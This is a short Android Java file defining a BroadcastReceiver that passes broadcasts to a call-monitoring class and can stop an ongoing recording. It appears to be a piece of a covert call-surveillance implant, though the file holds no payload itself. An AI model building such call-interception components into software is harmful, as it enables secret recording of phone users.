package com.android.dvci.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by zeno on 08/01/15.
 */
public class BC extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		BroadcastMonitorCall.onReceive(context, intent);
	}

	public void stopOnGoingRec() {
		BroadcastMonitorCall.stopOnGoingRec();
	}
}
